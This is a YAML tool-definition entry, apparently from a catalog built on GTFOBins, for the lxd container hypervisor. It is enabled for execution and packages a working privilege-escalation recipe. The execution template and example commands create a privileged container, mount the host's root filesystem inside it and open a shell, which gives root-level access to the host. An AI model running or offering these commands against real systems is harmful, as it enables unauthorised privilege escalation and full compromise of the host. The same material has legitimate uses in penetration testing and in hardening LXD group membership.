---
id: container-lxd-lxd
namespace: container:lxd:lxd
name: lxd
description: Container hypervisor, can spawn privileged containers with host filesystem.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - lxc
  - docker
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 64
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 64
  network: low
  disk_io: low
allowed-tools:
  - lxd
  - lxc
  - Bash
  - execFile
parameters: []
features:
  - requires-root
  - process-manip
execution:
  template: "lxc init ubuntu:latest priv -c security.privileged=true && lxc config device add priv host disk source=/ path=/mnt/root"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Spawn privileged container with host access
    command: |
      lxc init ubuntu:latest priv -c security.privileged=true
      lxc config device add priv host disk source=/ path=/mnt/root
      lxc start priv
      lxc exec priv /bin/sh
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/lxd/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "lxd"
    commands:
      - "apt-get install -y lxd"
---
